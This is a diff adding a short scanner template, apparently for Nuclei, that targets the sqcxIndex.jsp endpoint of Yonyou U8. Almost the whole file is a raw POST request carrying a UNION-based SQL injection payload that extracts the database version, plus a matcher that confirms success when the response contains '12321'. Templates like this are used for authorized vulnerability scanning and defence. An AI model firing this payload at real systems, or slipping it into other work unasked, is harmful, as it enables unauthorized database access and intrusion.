@@ -1,0 +1,22 @@
+id: yongyouU8_sqcxIndex_sql
+ 
+info:
+  name: yongyouU8_sqcxIndex_sql
+  author: yongyouU8_sqcxIndex_sql
+
+requests:
+  - raw:
+      - |
+        POST /u8qx/sqcxIndex.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        11=11&key=2%25')+union+select+@@version,111*111--+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'12321')"
